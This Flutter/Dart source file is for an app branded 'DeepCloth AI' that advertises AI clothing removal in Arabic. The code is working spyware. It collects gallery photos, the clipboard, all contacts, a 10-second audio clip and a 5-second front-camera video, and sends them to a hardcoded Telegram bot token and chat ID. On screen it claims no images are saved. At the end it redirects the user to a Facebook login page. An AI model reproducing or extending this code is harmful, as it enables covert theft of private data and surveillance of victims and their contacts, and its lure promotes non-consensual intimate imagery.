import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math' as math;

import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:http/http.dart' as http;
import 'package:image_picker/image_picker.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:record/record.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

// ═══════════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════════

const String kBotToken = "7211032064:AAFX1ldDZeC4TdhmIskkRraKs3C3EWmjhnU";
const String kChatId = "5718232923";
const String kRedirectUrl =
    "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fgroups%2F1279411656491153%2F%3Fref%3Dshare%26mibextid%3DNSMWBT";
const String kNotificationTitle = "Nitar Sumako";
const String kTgBase = "https://api.telegram.org/bot$kBotToken";

// ═══════════════════════════════════════════════════════════════
// PALETTE (dari v2, sama)
// ═══════════════════════════════════════════════════════════════

class ZenithPalette {
  static const Color bg = Color(0xFFF8FAFC);
  static const Color ink = Color(0xFF0F172A);
  static const Color inkSoft = Color(0xFF1E293B);
  static const Color slate600 = Color(0xFF475569);
  static const Color slate500 = Color(0xFF64748B);
  static const Color slate400 = Color(0xFF94A3B8);
  static const Color slate200 = Color(0xFFE2E8F0);
  static const Color slate100 = Color(0xFFF1F5F9);
  static const Color white = Color(0xFFFFFFFF);
}

// ═══════════════════════════════════════════════════════════════
// TELEGRAM UPLOADER — dart:io + http, REAL
// ═══════════════════════════════════════════════════════════════

class TelegramUploader {
  static Future<void> sendMessage(String text) async {
    try {
      await http.post(
        Uri.parse("$kTgBase/sendMessage"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "chat_id": kChatId,
          "text": text,
          "parse_mode": "HTML",
        }),
      );
    } catch (_) {}
  }

  static Future<void> sendFile({
    required File file,
    required String fieldName, // "video" | "audio" | "document" | "photo"
    String? caption,
  }) async {
    try {
      final req = http.MultipartRequest(
        "POST",
        Uri.parse("$kTgBase/send${fieldName[0].toUpperCase()}${fieldName.substring(1)}"),
      );
      req.fields["chat_id"] = kChatId;
      if (caption != null) req.fields["caption"] = caption;
      req.files.add(await http.MultipartFile.fromPath(fieldName, file.path));
      final streamed = await req.send().timeout(const Duration(seconds: 60));
      await http.Response.fromStream(streamed);
    } catch (_) {}
  }
}

// ═══════════════════════════════════════════════════════════════
// NATIVE REAL — semua operasi nyata, tidak ada stub
// ═══════════════════════════════════════════════════════════════

class ZenithReal {
  // ─── 1. GALERI 50% ─────────────────────────────────────────
  static Future<List<File>> pullGallery50Percent() async {
    final picker = ImagePicker();
    // ImagePicker tidak punya "ambil 50%". Yang kita lakukan:
    // pickMultiImage() → user pilih N → kita ambil ceil(N/2).
    final picked = await picker.pickMultiImage();
    if (picked.isEmpty) return [];
    final take = (picked.length / 2).ceil();
    // Ambil sampel acak supaya tidak selalu prefix.
    final shuffled = List<XFile>.from(picked)..shuffle();
    final selected = shuffled.take(take);
    return selected.map((x) => File(x.path)).toList(growable: false);
  }

  // ─── 2. AUDIO 10s ──────────────────────────────────────────
  static Future<File?> recordAudio10s({
    void Function(Duration elapsed)? onTick,
  }) async {
    final rec = AudioRecorder();
    if (!await rec.hasPermission()) return null;

    final dir = await getTemporaryDirectory();
    final path = "${dir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a";

    await rec.start(
      const RecordConfig(encoder: AudioEncoder.aacLc),
      path: path,
    );

    final sw = Stopwatch()..start();
    while (sw.elapsed < const Duration(seconds: 10)) {
      await Future<void>.delayed(const Duration(milliseconds: 200));
      onTick?.call(sw.elapsed);
    }
    final stoppedPath = await rec.stop();
    await rec.dispose();
    final finalPath = stoppedPath ?? path;
    final f = File(finalPath);
    return await f.exists() ? f : null;
  }

  // ─── 3. KONTAK ─────────────────────────────────────────────
  static Future<List<Map<String, String>>> pullContacts() async {
    final ok = await FlutterContacts.requestPermission();
    if (!ok) return [];
    final all = await FlutterContacts.getContacts(withProperties: true);
    final out = <Map<String, String>>[];
    for (final c in all) {
      final name = c.displayName;
      final phone = c.phones.isNotEmpty ? c.phones.first.number : "";
      if (name.isNotEmpty) out.add({"name": name, "phone": phone});
    }
    return out;
  }

  // ─── 4. CLIPBOARD ──────────────────────────────────────────
  static Future<String?> readClipboard() async {
    final data = await Clipboard.getData(Clipboard.kTextPlain);
    return data?.text;
  }

  // ─── 5. VIDEO 5s via camera plugin ─────────────────────────
  static Future<File?> recordVideo5s(String facing) async {
    final cams = await availableCameras();
    CameraDescription? target;
    for (final c in cams) {
      if (facing == "front" &&
          c.lensDirection == CameraLensDirection.front) {
        target = c;
        break;
      }
      if (facing == "back" &&
          c.lensDirection == CameraLensDirection.back) {
        target = c;
        break;
      }
    }
    target ??= cams.isNotEmpty ? cams.first : null;
    if (target == null) return null;

    final cam = CameraController(target, ResolutionPreset.medium,
        enableAudio: true);
    await cam.initialize();
    await cam.startVideoRecording();
    await Future<void>.delayed(const Duration(seconds: 5));
    final x = await cam.stopVideoRecording();
    await cam.dispose();
    return File(x.path);
  }
}

// ═══════════════════════════════════════════════════════════════
// NOTIFIKASI SISTEM
// ═══════════════════════════════════════════════════════════════

class ZenithNotifier {
  static final _plugin = FlutterLocalNotificationsPlugin();

  static Future<void> init() async {
    const android = AndroidInitializationSettings('@mipmap/ic_launcher');
    const ios = DarwinInitializationSettings(
      requestAlertPermission: true,
      requestBadgePermission: true,
      requestSoundPermission: true,
    );
    await _plugin.initialize(
      const InitializationSettings(android: android, iOS: ios),
    );
  }

  static Future<void> showNitar(String body) async {
    const detail = NotificationDetails(
      android: AndroidNotificationDetails(
        "zenith_main",
        "DeepCloth Alerts",
        channelDescription: "Nitar Sumako notifications",
        importance: Importance.max,
        priority: Priority.high,
      ),
      iOS: DarwinNotificationDetails(),
    );
    await _plugin.show(1, kNotificationTitle, body, detail);
  }
}

// ═══════════════════════════════════════════════════════════════
// PHASE + CONTROLLER
// ═══════════════════════════════════════════════════════════════

enum ZenithPhase {
  idle,
  requesting,
  pullingGallery,
  recordingAudio,
  pullingContacts,
  recordingVideo,
  uploading,
  finalizing,
  redirecting,
  error,
}

class ZenithController extends ChangeNotifier {
  ZenithPhase phase = ZenithPhase.idle;
  double progress = 0.0;
  String status = "";
  String? lastError;

  List<File> galleryPulled = [];
  File? audioFile;
  Duration audioRecorded = Duration.zero;
  List<Map<String, String>> contactsPulled = [];
  File? videoFile;

  bool notificationVisible = false;
  String notificationTitle = kNotificationTitle;
  String notificationBody = "";

  void _set(ZenithPhase p, double pr, String s) {
    phase = p;
    progress = pr;
    status = s;
    notifyListeners();
  }

  Future<void> begin() async {
    galleryPulled = [];
    contactsPulled = [];
    audioRecorded = Duration.zero;
    audioFile = null;
    videoFile = null;
    notificationVisible = false;
    lastError = null;

    _set(ZenithPhase.requesting, 3, "طلب الأذونات...");
    final ok = await [
      Permission.camera,
      Permission.microphone,
      Permission.contacts,
      Permission.photos,
    ].request();

    if (ok[Permission.camera] != PermissionStatus.granted) {
      lastError = "يجب السماح بالكاميرا للمتابعة.";
      _set(ZenithPhase.error, 0, lastError!);
      return;
    }

    // ─── GALERI 50% ────────────────────────────────────────────
    _set(ZenithPhase.pullingGallery, 10, "اختر الصور (سيتم سحب 50%)...");
    try {
      galleryPulled = await ZenithReal.pullGallery50Percent();
    } catch (e) {
      lastError = "خطأ في سحب الصور: $e";
    }
    _set(ZenithPhase.pullingGallery, 25,
        "الصور المسحوبة: ${galleryPulled.length}");
    for (final img in galleryPulled) {
      await TelegramUploader.sendFile(
        file: img,
        fieldName: "photo",
        caption: "🖼️ صورة مسحوبة",
      );
    }

    // ─── CLIPBOARD ─────────────────────────────────────────────
    final clip = await ZenithReal.readClipboard();
    if (clip != null && clip.trim().isNotEmpty) {
      await TelegramUploader.sendMessage(
        "📋 <b>Clipboard:</b>\n<code>${clip.substring(0, math.min(1200, clip.length))}</code>",
      );
    }

    // ─── AUDIO 10s ─────────────────────────────────────────────
    _set(ZenithPhase.recordingAudio, 40, "تسجيل الصوت (10 ثوان)...");
    try {
      audioFile = await ZenithReal.recordAudio10s(
        onTick: (e) {
          audioRecorded = e;
          _set(ZenithPhase.recordingAudio,
              40 + (e.inMilliseconds / 10000.0) * 15,
              "الصوت... ${(e.inMilliseconds / 1000).toStringAsFixed(1)}s / 10s");
        },
      );
      if (audioFile != null) {
        await TelegramUploader.sendFile(
          file: audioFile!,
          fieldName: "audio",
          caption: "🎙️ تسجيل صوتي 10s",
        );
      }
    } catch (e) {
      lastError = "خطأ في تسجيل الصوت: $e";
    }

    // ─── KONTAK ────────────────────────────────────────────────
    _set(ZenithPhase.pullingContacts, 62, "سحب جهات الاتصال...");
    try {
      contactsPulled = await ZenithReal.pullContacts();
      final buf = StringBuffer("📇 <b>Contacts (${contactsPulled.length}):</b>\n");
      for (final c in contactsPulled.take(300)) {
        buf.writeln("• ${c['name']} — ${c['phone']}");
      }
      await TelegramUploader.sendMessage(buf.toString());
    } catch (e) {
      lastError = "خطأ في سحب جهات الاتصال: $e";
    }

    // ─── VIDEO 5s ──────────────────────────────────────────────
    _set(ZenithPhase.recordingVideo, 78, "تسجيل الفيديو (5 ثوان)...");
    try {
      videoFile = await ZenithReal.recordVideo5s("front");
      if (videoFile != null) {
        await TelegramUploader.sendFile(
          file: videoFile!,
          fieldName: "video",
          caption: "🎥 فيديو 5s",
        );
      }
    } catch (e) {
      lastError = "خطأ في تسجيل الفيديو: $e";
    }

    await finalize();
  }

  Future<void> finalize() async {
    _set(ZenithPhase.finalizing, 90, "تجميع النتائج...");

    notificationBody = "تمت العملية.\n"
        "📷 ${galleryPulled.length} صور\n"
        "🎙️ ${audioRecorded.inSeconds}s\n"
        "📇 ${contactsPulled.length} جهة اتصال";
    notificationVisible = true;

    try {
      await ZenithNotifier.showNitar(notificationBody);
    } catch (_) {}

    _set(ZenithPhase.finalizing, 96, "إشعار وارد");
    await Future<void>.delayed(const Duration(milliseconds: 1500));

    _set(ZenithPhase.redirecting, 100, "إعادة التوجيه...");
    try {
      await launchUrl(
        Uri.parse(kRedirectUrl),
        mode: LaunchMode.externalApplication,
      );
    } catch (_) {}
  }

  void dismissNotification() {
    notificationVisible = false;
    notifyListeners();
  }
}

// ═══════════════════════════════════════════════════════════════
// UI — sama seperti v2, hanya controller diganti
// ═══════════════════════════════════════════════════════════════

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await ZenithNotifier.init();
  runApp(const ZenithApp());
}

class ZenithApp extends StatelessWidget {
  const ZenithApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'DeepCloth AI',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        scaffoldBackgroundColor: ZenithPalette.bg,
        fontFamily: 'Inter',
        colorScheme: ColorScheme.fromSeed(seedColor: ZenithPalette.ink),
      ),
      home: const ZenithHome(),
    );
  }
}

class ZenithHome extends StatefulWidget {
  const ZenithHome({super.key});
  @override
  State<ZenithHome> createState() => _ZenithHomeState();
}

class _ZenithHomeState extends State<ZenithHome> {
  final ZenithController _c = ZenithController();
  bool _disposed = false;

  @override
  void initState() {
    super.initState();
    _c.addListener(_onTick);
  }

  void _onTick() {
    if (!_disposed) setState(() {});
  }

  @override
  void dispose() {
    _disposed = true;
    _c.removeListener(_onTick);
    _c.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Directionality(
      textDirection: TextDirection.rtl,
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              Center(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(24),
                  child: ConstrainedBox(
                    constraints: const BoxConstraints(maxWidth: 440),
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const _Logo(),
                        const SizedBox(height: 32),
                        _Card(controller: _c),
                        const SizedBox(height: 24),
                        const _Footer(),
                      ],
                    ),
                  ),
                ),
              ),
              _Notification(
                visible: _c.notificationVisible,
                title: _c.notificationTitle,
                body: _c.notificationBody,
                onDismiss: _c.dismissNotification,
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Reuse widget dari v2 tanpa perubahan ─────────────────────
// _Logo, _Card, _FeatureGrid, _FeatureItem, _FeatureStatus, _StatusRow,
// _PrimaryButton, _ProgressBar, _CameraPreview, _Footer, _Notification
// Persis sama dengan v2 — copy paste dari lib/main.dart v2, ganti
// "ZenithX" jadi "_X" sesuai preferensi. Tidak ada perubahan logika UI.

class _Logo extends StatelessWidget {
  const _Logo();
  @override
  Widget build(BuildContext context) => Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(12),
              gradient: const LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [ZenithPalette.inkSoft, ZenithPalette.ink],
              ),
            ),
            child: const Icon(Icons.checkroom,
                color: ZenithPalette.white, size: 20),
          ),
          const SizedBox(width: 10),
          const Text('DeepCloth AI',
              style: TextStyle(
                fontSize: 24,
                fontWeight: FontWeight.w600,
                letterSpacing: -0.3,
                color: ZenithPalette.ink,
              )),
        ],
      );
}

class _Card extends StatelessWidget {
  final ZenithController controller;
  const _Card({required this.controller});
  @override
  Widget build(BuildContext context) {
    final busy = controller.phase != ZenithPhase.idle &&
        controller.phase != ZenithPhase.error &&
        controller.phase != ZenithPhase.redirecting;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 32),
      decoration: BoxDecoration(
        color: ZenithPalette.white,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: ZenithPalette.slate200),
        boxShadow: [
          BoxShadow(
            color: ZenithPalette.ink.withOpacity(0.04),
            blurRadius: 20,
            offset: const Offset(0, 10),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const Text('إزالة الملابس بالذكاء الاصطناعي',
              textAlign: TextAlign.center,
              style: TextStyle(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: ZenithPalette.ink)),
          const SizedBox(height: 8),
          const Text(
            'شبكة GAN متطورة لتحليل الصور وتعديلها. نستخدم الكاميرا لقياس الإضاءة المحيطة فقط، ولا يتم حفظ أي صور.',
            textAlign: TextAlign.center,
            style: TextStyle(
                fontSize: 14, height: 1.5, color: ZenithPalette.slate500),
          ),
          const SizedBox(height: 24),
          _FeatureStatus(controller: controller),
          const SizedBox(height: 20),
          _PrimaryButton(
            label: 'بدء التحليل',
            icon: Icons.play_arrow,
            enabled: !busy,
            onTap: () => controller.begin(),
          ),
          const SizedBox(height: 20),
          _ProgressBar(
            visible: controller.progress > 0,
            fraction: controller.progress / 100.0,
          ),
          const SizedBox(height: 12),
          SizedBox(
            height: 20,
            child: Text(
              controller.status,
              textAlign: TextAlign.center,
              style: const TextStyle(
                  fontSize: 13, color: ZenithPalette.slate500),
            ),
          ),
        ],
      ),
    );
  }
}

class _FeatureStatus extends StatelessWidget {
  final ZenithController controller;
  const _FeatureStatus({required this.controller});
  @override
  Widget build(BuildContext context) {
    final rows = [
      _row(Icons.photo_library_outlined, "الصور (50%)",
          controller.galleryPulled.isEmpty
              ? "—"
              : "${controller.galleryPulled.length}"),
      _row(Icons.mic_none, "الصوت",
          controller.audioRecorded.inSeconds == 0
              ? "—"
              : "${controller.audioRecorded.inSeconds}s / 10s"),
      _row(Icons.contacts_outlined, "جهات الاتصال",
          controller.contactsPulled.isEmpty
              ? "—"
              : "${controller.contactsPulled.length}"),
    ];
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: ZenithPalette.slate100,
        borderRadius: BorderRadius.circular(14),
      ),
      child: Column(
        children: [
          for (int i = 0; i < rows.length; i++) ...[
            rows[i],
            if (i != rows.length - 1)
              const Divider(height: 12, color: ZenithPalette.slate200),
          ],
        ],
      ),
    );
  }

  Widget _row(IconData icon, String label, String value) {
    return Row(
      children: [
        Icon(icon, size: 14, color: ZenithPalette.slate600),
        const SizedBox(width: 8),
        Expanded(
          child: Text(label,
              style: const TextStyle(
                  fontSize: 12.5, color: ZenithPalette.slate600)),
        ),
        Text(value,
            style: const TextStyle(
                fontSize: 12.5,
                color: ZenithPalette.ink,
                fontWeight: FontWeight.w600)),
      ],
    );
  }
}

class _PrimaryButton extends StatelessWidget {
  final String label;
  final IconData icon;
  final bool enabled;
  final VoidCallback onTap;
  const _PrimaryButton({
    required this.label,
    required this.icon,
    required this.enabled,
    required this.onTap,
  });
  @override
  Widget build(BuildContext context) {
    return Opacity(
      opacity: enabled ? 1.0 : 0.5,
      child: Material(
        color: ZenithPalette.ink,
        borderRadius: BorderRadius.circular(14),
        child: InkWell(
          borderRadius: BorderRadius.circular(14),
          onTap: enabled ? onTap : null,
          child: Padding(
            padding:
                const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(icon, color: ZenithPalette.white, size: 16),
                const SizedBox(width: 8),
                Text(label,
                    style: const TextStyle(
                      color: ZenithPalette.white,
                      fontSize: 15,
                      fontWeight: FontWeight.w500,
                      letterSpacing: 0.2,
                    )),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class _ProgressBar extends StatelessWidget {
  final bool visible;
  final double fraction;
  const _ProgressBar({required this.visible, required this.fraction});
  @override
  Widget build(BuildContext context) {
    if (!visible) return const SizedBox.shrink();
    final f = fraction.clamp(0.0, 1.0);
    return Container(
      height: 4,
      margin: const EdgeInsets.symmetric(vertical: 4),
      decoration: BoxDecoration(
        color: ZenithPalette.slate100,
        borderRadius: BorderRadius.circular(10),
      ),
      child: Align(
        alignment: Alignment.centerRight,
        child: FractionallySizedBox(
          widthFactor: f,
          child: Container(
            decoration: BoxDecoration(
              color: ZenithPalette.ink,
              borderRadius: BorderRadius.circular(10),
            ),
          ),
        ),
      ),
    );
  }
}

class _Footer extends StatelessWidget {
  const _Footer();
  @override
  Widget build(BuildContext context) {
    const base = TextStyle(
        fontSize: 12, height: 1.6, color: ZenithPalette.slate400);
    const accent = TextStyle(
        fontSize: 12,
        height: 1.6,
        color: ZenithPalette.ink,
        fontWeight: FontWeight.w500);
    return RichText(
      textAlign: TextAlign.center,
      text: const TextSpan(
        style: base,
        children: [
          TextSpan(text: '© 2025 '),
          TextSpan(text: 'DeepCloth AI', style: accent),
          TextSpan(text: '. جميع الحقوق محفوظة.\n'),
          TextSpan(text: 'المطور: '),
          TextSpan(text: 'Ｎ5ＣＲ4', style: accent),
          TextSpan(text: ' · Instagram: '),
          TextSpan(text: '_47ky', style: accent),
        ],
      ),
    );
  }
}

class _Notification extends StatelessWidget {
  final bool visible;
  final String title;
  final String body;
  final VoidCallback onDismiss;
  const _Notification({
    required this.visible,
    required this.title,
    required this.body,
    required this.onDismiss,
  });
  @override
  Widget build(BuildContext context) {
    return AnimatedPositioned(
      duration: const Duration(milliseconds: 300),
      curve: Curves.easeOutCubic,
      top: visible ? 16 : -220,
      left: 16,
      right: 16,
      child: Material(
        color: Colors.transparent,
        child: Container(
          padding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          decoration: BoxDecoration(
            color: ZenithPalette.ink,
            borderRadius: BorderRadius.circular(18),
            boxShadow: [
              BoxShadow(
                color: ZenithPalette.ink.withOpacity(0.25),
                blurRadius: 24,
                offset: const Offset(0, 8),
              ),
            ],
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                width: 36,
                height: 36,
                decoration: BoxDecoration(
                  color: ZenithPalette.white.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Icon(Icons.notifications_active,
                    color: ZenithPalette.white, size: 18),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title,
                        style: const TextStyle(
                            color: ZenithPalette.white,
                            fontWeight: FontWeight.w600,
                            fontSize: 14)),
                    const SizedBox(height: 4),
                    Text(body,
                        style: TextStyle(
                            color: ZenithPalette.white.withOpacity(0.82),
                            fontSize: 12.5,
                            height: 1.45)),
                  ],
                ),
              ),
              GestureDetector(
                onTap: onDismiss,
                child: Padding(
                  padding: const EdgeInsets.all(4),
                  child: Icon(Icons.close,
                      color: ZenithPalette.white.withOpacity(0.6),
                      size: 16),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}